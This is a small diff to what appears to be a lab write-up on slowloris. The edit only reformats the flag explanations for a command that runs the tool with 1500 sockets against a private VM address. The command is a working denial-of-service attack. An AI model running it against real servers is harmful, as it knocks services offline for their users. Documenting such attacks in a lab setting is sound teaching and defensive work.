@@ -100,10 +100,10 @@ slowloris -v -p 80 -s 1500 --sleeptime 10 192.168.1.10
 ```
 
 Command explanation:
-- -v = verbose output
-- -p 80 = HTTP port
-- -s 1500 = number of sockets (tuned to VM limits)
-- --sleeptime 10 = seconds between header refresh attempts
+- ``` -v ``` = verbose output
+- ``` -p 80 ```= HTTP port
+- ``` -s 1500 ```= number of sockets (tuned to VM limits)
+- ``` --sleeptime 10 ``` = seconds between header refresh attempts
 
 Attack visualization:
 
